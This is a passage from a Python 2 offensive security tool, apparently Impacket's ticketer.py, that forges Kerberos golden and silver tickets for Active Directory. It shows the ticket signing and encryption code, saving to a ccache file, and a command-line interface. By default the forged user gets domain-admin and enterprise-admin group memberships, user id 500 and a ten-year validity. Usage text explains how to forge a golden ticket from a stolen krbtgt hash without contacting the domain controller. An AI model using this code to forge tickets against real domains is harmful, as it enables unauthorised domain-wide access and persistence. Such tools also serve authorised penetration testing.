            cipherText = cipher.encrypt(sessionKey, 3, str(encodedEncASRepPart), None)
        else:
            # Key Usage 8
            # TGS-REP encrypted part (includes application session
            # key), encrypted with the TGS session key
            # (Section 5.4.2)
            sessionKey = Key(cipher.enctype, str(encASorTGSRepPart['key']['keyvalue']))
            logging.info('\tEncTGSRepPart')
            cipherText = cipher.encrypt(sessionKey, 8, str(encodedEncASRepPart), None)

        kdcRep['enc-part']['cipher'] = cipherText
        kdcRep['enc-part']['etype'] = cipher.enctype
        kdcRep['enc-part']['kvno'] = 1

        if logging.getLogger().level == logging.DEBUG:
            logging.debug('Final Golden Ticket')
            print kdcRep.prettyPrint()
            print ('\n')

        return encoder.encode(kdcRep), cipher, sessionKey

    def saveTicket(self, ticket, sessionKey):
        logging.info('Saving ticket in %s' % (self.__target.replace('/', '.') + '.ccache'))
        from impacket.krb5.ccache import CCache
        ccache = CCache()

        if self.__server == self.__domain:
            ccache.fromTGT(ticket, sessionKey, sessionKey)
        else:
            ccache.fromTGS(ticket, sessionKey, sessionKey)
        ccache.saveFile(self.__target.replace('/','.') + '.ccache')

    def run(self):
        ticket, adIfRelevant = self.createBasicTicket()
        if ticket is not None:
            encASorTGSRepPart, encTicketPart, pacInfos = self.customizeTicket(ticket, adIfRelevant)
            ticket, cipher, sessionKey = self.signEncryptTicket(ticket, encASorTGSRepPart, encTicketPart, pacInfos)
            self.saveTicket(ticket, sessionKey)

if __name__ == '__main__':
    # Init the example's logger theme
    logger.init()
    print version.BANNER

    parser = argparse.ArgumentParser(add_help=True, description="Creates a Kerberos golden/silver tickets based on "
                                                                "user options")
    parser.add_argument('target', action='store', help='username for the newly created ticket')
    parser.add_argument('-spn', action="store", help='SPN (service/server) of the target service the silver ticket will'
                                                     ' be generated for. if omitted, golden ticket will be created')
    parser.add_argument('-request', action='store_true', default=False, help='Requests ticket to domain and clones it '
                        'changing only the supplied information. It requires specifying -user')
    parser.add_argument('-domain', action='store', required=True, help='the fully qualified domain name (e.g. contoso.com)')
    parser.add_argument('-domain-sid', action='store', required=True, help='Domain SID of the target domain the ticker will be '
                                                            'generated for')
    parser.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key used for signing the ticket '
                                                                             '(128 or 256 bits)')
    parser.add_argument('-nthash', action="store", help='NT hash used for signing the ticket')
    parser.add_argument('-groups', action="store", default = '513, 512, 520, 518, 519', help='comma separated list of '
                        'groups user will belong to (default = 513, 512, 520, 518, 519)')
    parser.add_argument('-user-id', action="store", default = '500', help='user id for the user the ticket will be '
                                                                          'created for (default = 500)')
    parser.add_argument('-extra-sid', action="store", help='Comma separated list of ExtraSids to be included inside the ticket\'s PAC')
    parser.add_argument('-duration', action="store", default = '3650', help='Amount of days till the ticket expires '
                                                                            '(default = 365*10)')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')

    group = parser.add_argument_group('authentication')

    group.add_argument('-user', action="store", help='domain/username to be used if -request is chosen (it can be '
                                                     'different from domain/username')
    group.add_argument('-password', action="store", help='password for domain/username')
    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-dc-ip', action='store',metavar = "ip address",  help='IP Address of the domain controller. If '
                       'ommited it use the domain part (FQDN) specified in the target parameter')

    if len(sys.argv)==1:
        parser.print_help()
        print "\nExamples: "
        print "\t./ticketer.py -nthash <krbtgt/service nthash> -domain-sid <your domain SID> -domain <your domain FQDN> baduser\n"
        print "\twill create and save a golden ticket for user 'baduser' that will be all encrypted/signed used RC4."
        print "\tIf you specify -aesKey instead of -ntHash everything will be encrypted using AES128 or AES256"
        print "\t(depending on the key specified). No traffic is generated against the KDC. Ticket will be saved as"
        print "\tbaduser.ccache.\n"
        print "\t./ticketer.py -nthash <krbtgt/service nthash> -aesKey <krbtgt/service AES> -domain-sid <your domain SID> -domain " \
              "<your domain FQDN> -request -user <a valid domain user> -password <valid domain user's password> baduser\n"
        print "\twill first authenticate against the KDC (using -user/-password) and get a TGT that will be used"
        print "\tas template for customization. Whatever encryption algorithms used on that ticket will be honored,"
        print "\thence you might need to specify both -nthash and -aesKey data. Ticket will be generated for 'baduser'"
        print "\tand saved as baduser.ccache"
        sys.exit(1)

    options = parser.parse_args()

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
    else:
        logging.getLogger().setLevel(logging.INFO)

    if options.domain is None:
        logging.critical('Domain should be specified!')
        sys.exit(1)

    if options.aesKey is None and options.nthash is None:
        logging.error('You have to specify either a aesKey or nthash')
        sys.exit(1)

    if options.aesKey is not None and options.nthash is not None and options.request is False:
        logging.error('You cannot specify both -aesKey and -nthash w/o using -request. Pick only one')
        sys.exit(1)

    if options.request is True and options.user is None:
        logging.error('-request parameter needs -user to be specified')
        sys.exit(1)

    if options.request is True and options.hashes is None and options.password is None:
        from getpass import getpass
        password = getpass("Password:")
    else:
        password = options.password

    try:
        executer = TICKETER(options.target, password, options.domain, options)
        executer.run()
    except Exception, e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback
            traceback.print_exc()
        print str(e)
